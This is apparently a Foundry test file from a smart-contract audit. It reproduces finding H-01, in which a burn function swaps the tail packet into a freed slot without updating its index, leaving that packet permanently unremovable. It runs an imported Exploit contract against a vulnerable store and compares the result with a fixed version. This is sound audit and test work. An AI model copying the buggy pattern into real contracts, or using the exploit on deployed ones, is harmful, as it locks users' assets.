// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    PacketStore,
    PacketStoreFixed,
    MiniToken
} from "./62594-h-01-missing-index-updates-in-burnpacketfrominventory-cause.sol";

contract MissingIndexUpdatesBurnPacketTest is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    uint256 internal constant P1 = 101;
    uint256 internal constant P2 = 102;
    uint256 internal constant P3 = 103;

    function test_exploit_movedPacketBecomesPermanentlyUnremovable() public {
        Exploit e = new Exploit();
        e.run();

        // After burning P1, the tail packet P3 was moved into slot 0, but its
        // reverse index was never updated: it still reads 2 while the array is
        // now length 2 -> a stale, out-of-bounds index.
        assertEq(e.buggyLenAfterFirstBurn(), 2, "buggy inventory shrank to length 2");
        assertEq(e.buggyStaleIdx(), 2, "moved packet P3 keeps its stale (OOB) index");

        // HARM: burning the moved packet reverts permanently -> P3 is stuck.
        assertTrue(e.buggyBurnReverted(), "buggy burn of moved packet reverts (inventory DoS)");
        assertEq(e.stuckPacketId(), P3, "the permanently-unremovable packet is P3");

        // CONTROL: the audit's two-line fix removes the same packet cleanly.
        assertTrue(e.fixedBurnSucceeded(), "fixed variant burns the moved packet successfully");

        // Harm magnitude recorded on the marker at the SINK: 1 stuck packet.
        MiniToken marker = MiniToken(e.markerAddr());
        assertEq(marker.balanceOf(SINK), 1, "marker records 1 permanently-stuck packet at SINK");
        assertEq(e.sinkMarkerBalance(), 1, "exposed sink marker balance matches");
    }

    // Direct, cheatcode-backed reproduction of the exact revert on the real
    // vulnerable contract: burning the moved packet panics with array OOB (0x32).
    function test_directRevert_buggyBurnOfMovedPacketIsIndexOOB() public {
        PacketStore store = new PacketStore();

        uint256[] memory ids = new uint256[](3);
        ids[0] = P1;
        ids[1] = P2;
        ids[2] = P3;
        store.addPacketsToInventory(ids);

        // Sanity: initial reverse-index invariant holds.
        assertEq(store.idxOf(P1), 0);
        assertEq(store.idxOf(P2), 1);
        assertEq(store.idxOf(P3), 2);
        assertEq(store.inventoryLength(), 3);

        // Burn the head; swap-pops the tail P3 into slot 0 but leaves indices stale.
        store.burnPacketFromInventory(P1);
        assertEq(store.inventoryLength(), 2, "array shrank");
        assertEq(store.inventoryAt(0), P3, "P3 physically moved into slot 0");
        assertEq(store.idxOf(P3), 2, "but P3's recorded index is still 2 (now OOB)");

        // Burning the moved packet reads the stale index 2 -> Panic(0x32) OOB.
        vm.expectRevert(stdError.indexOOBError);
        store.burnPacketFromInventory(P3);
    }

    // Negative control on the real fixed contract: the identical sequence keeps
    // indices consistent and every packet remains removable.
    function test_control_fixedKeepsIndicesConsistent() public {
        PacketStoreFixed store = new PacketStoreFixed();

        uint256[] memory ids = new uint256[](3);
        ids[0] = P1;
        ids[1] = P2;
        ids[2] = P3;
        store.addPacketsToInventory(ids);

        store.burnPacketFromInventory(P1);
        // Fix updates the moved packet's index to its new slot.
        assertEq(store.inventoryLength(), 2, "array shrank");
        assertEq(store.inventoryAt(0), P3, "P3 moved into slot 0");
        assertEq(store.idxOf(P3), 0, "fixed: P3's index tracks its new slot");
        assertEq(store.idxOf(P1), 0, "fixed: burned packet's index was deleted (default 0)");

        // The moved packet can still be removed cleanly.
        store.burnPacketFromInventory(P3);
        assertEq(store.inventoryLength(), 1, "P3 removed");
        assertEq(store.inventoryAt(0), P2, "P2 moved into slot 0");
        assertEq(store.idxOf(P2), 0, "fixed: P2's index tracks its new slot");

        // And P2 too.
        store.burnPacketFromInventory(P2);
        assertEq(store.inventoryLength(), 0, "inventory fully drained without reverting");
    }
}
